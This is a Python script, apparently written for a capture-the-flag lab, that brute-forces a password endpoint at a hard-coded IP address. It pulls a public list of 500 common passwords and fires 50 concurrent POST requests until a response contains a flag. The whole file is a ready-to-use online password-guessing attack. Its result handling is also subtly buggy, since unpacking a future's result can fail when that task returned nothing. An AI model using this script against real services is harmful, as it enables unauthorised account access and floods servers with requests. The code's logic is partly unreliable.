import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

test_url = "http://83.136.252.205:59239/dictionary"
passwd_dict = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt"

# 共享状态控制
found_event = threading.Event()
result_lock = threading.Lock()
print_lock = threading.Lock()

def load_passwords():
    try:
        response = requests.get(passwd_dict, timeout=10)
        response.raise_for_status()
        return response.text.splitlines()  # 修正缺少括号的问题
    except Exception as e:
        print(f"Failed to load password list: {e}")
        return []

def test_password(password):
    global found_event
    
    # 提前终止检查
    if found_event.is_set():
        return None

    try:
        # 发送带超时的POST请求
        response = requests.post(
            test_url,
            data={"password": password},
            timeout=5
        )
        
        # 处理成功的响应
        if response.status_code == 200:
            data = response.json()
            if "flag" in data:
                with result_lock:
                    if not found_event.is_set():
                        found_event.set()
                        return (password, data["flag"])
                        
        # 可选：输出进度提示
        with print_lock:
            print(f"\rTesting: {password.ljust(20)}", end="", flush=True)
            
    except requests.exceptions.RequestException as e:
        # 网络错误处理
        pass
    except ValueError as e:
        # JSON解析错误处理
        pass
        
    return None

def main():
    passwords = load_passwords()
    if not passwords:
        return

    with ThreadPoolExecutor(max_workers=50) as executor:  # 根据服务器承受能力调整
        # 提交所有任务
        futures = {executor.submit(test_password, pwd): pwd for pwd in passwords}
        
        # 处理完成的任务
        for future in as_completed(futures):
            if found_event.is_set():
                # 获取并存储结果
                password, flag = future.result()
                # 取消未完成的任务
                for f in futures:
                    f.cancel()
                break

    # 输出结果
    if found_event.is_set():
        print(f"\n\nSuccess! Password: {password}")
        print(f"Flag: {flag}")
    else:
        print("\nPassword not found in the list")

if __name__ == "__main__":
    main()
